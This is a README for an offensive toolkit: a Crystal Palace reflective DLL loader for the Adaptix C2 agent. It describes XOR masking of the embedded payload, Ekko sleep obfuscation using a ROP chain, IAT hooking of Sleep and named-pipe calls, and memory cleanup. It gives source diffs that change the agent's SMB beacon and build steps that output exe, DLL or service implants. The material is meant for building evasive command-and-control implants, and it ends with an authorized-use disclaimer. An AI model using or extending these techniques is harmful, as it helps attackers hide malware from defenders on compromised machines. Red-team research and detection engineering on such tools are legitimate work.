# Crystal Palace RDLL Template for Adaptix C2

A Reflective DLL Loader for [Adaptix C2](https://github.com/Jekoie/Adaptix) built with [Crystal Palace](https://www.cobaltstrike.com/product/crystal-palace). Features IAT hooking, Ekko-style sleep obfuscation, and per-section memory permission management.

## What It Does

1. **Loads the Adaptix agent DLL** from a PIC blob via a custom reflective loader.
2. **XOR resource masking** — the DLL is XOR-encrypted at link time with a random 128-byte key (via Crystal Palace `generate`/`xor`/`preplen` directives). At runtime the loader decrypts it into a temporary buffer, maps it, then wipes and frees the cleartext copy.
3. **Ekko sleep obfuscation** — when `Sleep`, `ConnectNamedPipe`, `FlushFileBuffers` or `WaitForSingleObjectEx` are called, the entire DLL image is RC4-encrypted in memory via a 6-step `NtContinue` ROP chain (timer queue callbacks), then decrypted on wake.
4. **Per-section permission restore** — after decryption, a PE section walker applies the correct page protections (`.text` → `RX`, `.data` → `RW`, etc.) instead of blanket `RWX`, ensuring BOF compatibility.
5. **PIC cleanup** — after `go()` returns, the loader's own RX allocation is wiped and freed.

## Project Structure

```
build/                    # Compiled COFF objects and PIC blob (agent.bin)
output/                   # Final compiled binaries (agent.exe, agent.dll)
src/
  loader.c                # Main PIC — XOR-unmasks DLL, loads PICO, maps DLL, fixes permissions, calls entry point
  hooks.c                 # _Sleep, _ConnectNamedPipe, _FlushFileBuffers, _WaitForSingleObjectEx hooks → EkkoObf() + restore_section_permissions()
  pico.c                  # PICO — hooked GetProcAddress, setup_hooks(), set_image_info()
  services.c              # API resolution via hash walking
  loader.h                # PE export lookup helper
  tcg.h                   # Crystal Palace intrinsics & DLL loader structs
crystal_palace/
  specs/
    loader.spec           # Main PIC build spec (XOR masking, key generation)
    pico.spec             # PICO build spec (merges hooks.c, registers Sleep hook)
    services.spec         # Services build spec (API resolution via ror13/strings)
  link                    # Crystal Palace link wrapper
  piclink                 # Crystal Palace PIC link wrapper
  coffparse               # COFF parser utility
  disassemble             # Disassembler utility
  crystalpalace.jar       # Crystal Palace engine
  libtcg.x64.zip          # TCG runtime library
loader/
  include/
    Adaptix.h             # Adaptix C2 header
    Shellcode.h           # Auto-generated PIC blob as C hex array
  source/main/
    Exe.cc                # Final binary wrapper (EXE format)
    Dll.c                 # Final binary wrapper (DLL format)
    Svc.cc                # Final binary wrapper (service format)
  test/
    run.c                 # Test harness (loads and runs the PIC blob)
src_service/
  ax_config.axs           # Adaptix GUI configuration file
  config.yaml             # Adaptix configuration file
  go.mod                  # Go module file
  go.sum                  # Go checksum file
  Makefile                # Makefile for build orchestration
  pl_agent.go             # Build orchestrator (COFF → link → shellcode header → final binary)
  pl_main.go              # Adaptix builder plugin entry point
```

## Prerequisites

- Crystal Palace toolchain (included in `crystal_palace/`)
- MinGW cross-compiler (`x86_64-w64-mingw32-gcc`)
- Go (for `compile.go` build orchestrator)
- Clang (`clang++` targeting `x86_64-w64-mingw32`) for final binary compilation

## 🛠 Required Adaptix Source Changes

To support IAT hooking and the improved Overlapped IPC model, you must apply the following modifications to the Adaptix agent source before compilation.

## Adaptix Source Change

### ApiLoader.cpp (ApiLoad function)
Force `Sleep` to go through the Import Address Table (IAT) so the loader can hook it:

```diff
- ApiWin->Sleep = (decltype(Sleep)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
+ ApiWin->Sleep = &Sleep;
```

### ConnectorSMB.h (Header Updates)
```diff
struct SMBFUNC {
    // ...
+    DECL_API(CreateEventA);
+    DECL_API(WaitForSingleObjectEx);
+    DECL_API(GetOverlappedResult);
+    DECL_API(CloseHandle);
+    DECL_API(ResetEvent);
};
```

```diff
-void SendData(BYTE* data, ULONG data_size);
+void SendData(BYTE* data, ULONG data_size, BOOL expectResponse);
+BOOL PerformOverlappedIO(BOOL isRead, LPVOID buffer, DWORD length, LPDWORD transferred);
```

### ConnectorSMB.cpp (IPC Logic Rewrite)
```diff
- this->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
- this->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);
+  this->functions->ConnectNamedPipe    = &ConnectNamedPipe;
+  this->functions->FlushFileBuffers    = &FlushFileBuffers;
+  this->functions->WaitForSingleObjectEx = &WaitForSingleObjectEx;
+  this->functions->CreateEventA        = (decltype(CreateEventA)*)        GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CREATEEVENTA);
+  this->functions->GetOverlappedResult  = (decltype(GetOverlappedResult)*)  GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_GETOVERLAPPEDRESULT);
+  this->functions->CloseHandle         = (decltype(CloseHandle)*)         GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CLOSEHANDLE);
+  this->functions->ResetEvent           = (decltype(ResetEvent)*)           GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_RESETEVENT);

```

```diff
-   this->hChannel = this->functions->CreateNamedPipeA((CHAR*) profile.pipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x100000, 0x100000, 0, &sa);
+   this->hChannel = this->functions->CreateNamedPipeA((CHAR*) profile.pipename, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x100000, 0x100000, 0, &sa);

```

```diff
+BOOL ConnectorSMB::PerformOverlappedIO(BOOL isRead, LPVOID buffer, DWORD length, LPDWORD transferred) {
+    OVERLAPPED ov = { 0 };
+    ov.hEvent = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
+    if (!ov.hEvent) return FALSE;
+
+    BOOL success = isRead ? 
+        this->functions->ReadFile(this->hChannel, buffer, length, NULL, &ov) :
+        this->functions->WriteFile(this->hChannel, buffer, length, NULL, &ov);
+
+    if (!success && this->functions->GetLastError() == ERROR_IO_PENDING) {
+        this->functions->WaitForSingleObjectEx(ov.hEvent, INFINITE, TRUE);
+        success = TRUE;
+    }
+
+    if (success) success = this->functions->GetOverlappedResult(this->hChannel, &ov, transferred, FALSE);
+    this->functions->CloseHandle(ov.hEvent);
+    return success;
+}
```

```diff
-void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
-{
-    this->recvSize = 0;
-
-    if (data && data_size) {
-        DWORD NumberOfBytesWritten = 0;
-        if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
-            
-            DWORD index = 0;
-            DWORD size  = 0;
-            NumberOfBytesWritten = 0;
-            while (1) {
-                size = data_size - index;
-                if (data_size - index > 0x2000)
-                    size = 0x2000;
-
-                if ( !this->functions->WriteFile(this->hChannel, data + index, size, &NumberOfBytesWritten, 0) )
-                    break;
-
-                index += NumberOfBytesWritten;
-                if (index >= data_size)
-                    break;
-            }
-        }
-        this->functions->FlushFileBuffers(this->hChannel);
-    }
-
-    DWORD totalBytesAvail = 0;
-    BOOL result = this->functions->PeekNamedPipe(this->hChannel, 0, 0, 0, &totalBytesAvail, 0);
-    if (result && totalBytesAvail >= 4) {
-
-        DWORD NumberOfBytesRead = 0;
-        DWORD dataLength = 0;
-        if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
-            
-            if (dataLength > this->allocaSize) {
-                this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
-                this->allocaSize = dataLength;
-            }
-
-            NumberOfBytesRead = 0;
-            int index = 0;
-            while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
-                index += NumberOfBytesRead;
-        
-                if (index > dataLength) {
-                    this->recvSize = -1;
-                    return;
-                }
-
-                if (index == dataLength)
-                    break;
-            }
-            this->recvSize = index;
-        }
-    }
-}

+void ConnectorSMB::SendData(BYTE* data, ULONG data_size, BOOL expectResponse) 
+{
+    this->recvSize = 0;
+    DWORD transferred = 0;
+
+    if (data && data_size) {
+        if (!this->PerformOverlappedIO(FALSE, &data_size, 4, &transferred) || transferred != 4) {
+            return;
+        }
+
+        DWORD index = 0;
+        while (index < data_size) {
+            DWORD chunkSize = (data_size - index > 0x2000) ? 0x2000 : (data_size - index);
+            if (!this->PerformOverlappedIO(FALSE, data + index, chunkSize, &transferred)) break;
+            index += transferred;
+        }
+        this->functions->FlushFileBuffers(this->hChannel);
+    }
+
+    if (!expectResponse) {
+        return;
+    }
+
+    DWORD responseLength = 0;
+    if (!this->PerformOverlappedIO(TRUE, &responseLength, 4, &transferred) || transferred != 4) {
+        return;
+    }
+
+    if (responseLength > 0x1000000) return; 
+
+    if (responseLength > this->allocaSize) {
+        this->recvData = (BYTE*)this->functions->LocalReAlloc(this->recvData, responseLength, LMEM_MOVEABLE | LMEM_ZEROINIT);
+        this->allocaSize = responseLength;
+    }
+
+    if (this->PerformOverlappedIO(TRUE, this->recvData, responseLength, &transferred)) {
+        this->recvSize = transferred;
+    }
+}
```

### MainAgent.cpp (Change BEACON_SMB logic)
```diff
do {
- g_Connector->SendData(beat, beatSize);
+ g_Connector->SendData(beat, beatSize, TRUE);
    while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {
        // ... (Processing logic) ...

        if (packerOut->datasize() > 4) {
            // ... (Encryption logic) ...
            
-            g_Connector->SendData(packerOut->data(), packerOut->datasize());
+            g_Connector->SendData(packerOut->data(), packerOut->datasize(), TRUE);

            packerOut->Clear(TRUE);
            packerOut->Pack32(0);
        }
        else {
-            g_Connector->SendData(NULL, 0);            
+            g_Connector->SendData(NULL, 0, FALSE);
        }

        if (g_Connector->RecvSize() == 0 && this->functions->GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
    }

    if (!g_Agent->IsActive()) {
        g_Agent->commander->Exit(packerOut);
        packerOut->Set32(0, packerOut->datasize());
        EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

-        g_Connector->SendData(packerOut->data(), packerOut->datasize());        
+        g_Connector->SendData(packerOut->data(), packerOut->datasize(), FALSE);
        packerOut->Clear(TRUE);
    }

    g_Connector->Disconnect();
// ...
}

## Build

```bash
# Full build (COFF compile → Crystal Palace link → Shellcode.h → final binary)
go run compile.go -dll /path/to/agent.x64.dll -format exe -out agent

# Or step by step:
make clean && make all                                              # compile COFF objects
./crystal_palace/link crystal_palace/specs/loader.spec agent.dll agent.bin  # link PIC blob
go run compile.go -dll /path/to/agent.x64.dll -skip-coff -format exe       # skip COFF, build final binary
```

### compile.go flags

| Flag | Default | Description |
|------|---------|-------------|
| `-dll` | (required) | Path to the Adaptix agent DLL |
| `-format` | `exe` | Output format: `exe`, `dll`, or `svc` |
| `-out` | `agent` | Base name for the output binary |
| `-skip-coff` | `false` | Skip COFF compilation (reuse existing `.o` files) |
| `-skip-link` | `false` | Skip Crystal Palace link step (reuse existing `agent.bin`) |
| `-pic` | `agent.bin` | Path to pre-built PIC blob (used with `-skip-link`) |
| `-debug` | `false` | Compile with `-mconsole` instead of `-mwindows` |

```bash
# Run
.\agent.exe
```

## Resource Masking

The embedded DLL payload is never stored in cleartext inside the PIC blob. The `loader.spec` uses Crystal Palace directives to mask it at link time:

```ruby
generate $KEY 128       # random 128-byte XOR key

push $DLL
    xor $KEY            # XOR-encrypt the DLL
    preplen             # prepend its cleartext length
    link "dll"          # embed into the "dll" section

push $KEY
    preplen             # prepend the key length
    link "mask"         # embed into the "mask" section
```

At runtime, `loader.c` reads both sections as `RESOURCE` structs (length-prefixed blobs), XOR-decrypts the DLL into a temporary `VirtualAlloc` buffer, maps it into a properly laid-out image (`dll_dst`), then securely wipes and frees the temporary buffer.

## Compiler Flags

| Flag | Why |
|------|-----|
| `-mno-stack-arg-probe` | Avoids `___chkstk_ms` relocation (EkkoObf uses ~8.5 KB of stack) |
| `-fno-zero-initialized-in-bss` | Forces zero-init globals into `.data` instead of `.bss` (PIC can't resolve `.bss` relocations) |


## Credits

- Original Crystal Palace RDLL template by [Raphael Mudge](https://www.cobaltstrike.com)
- [Ekko](https://github.com/Cracked5pider/Ekko) sleep obfuscation by C5pider
- [Adaptix C2](https://github.com/Jekoie/Adaptix)
- [Kharon Agent](https://github.com/entropy-z/Kharon) for loader inspiration
- [h41th](https://github.com/h41th/Simple-Crystal-Palace-RDLL-template-for-Adaptix) for the original Crystal Palace loader template for Adaptix

## Disclaimer

This project is for educational and authorized red team use only. Obtain proper authorization before deploying.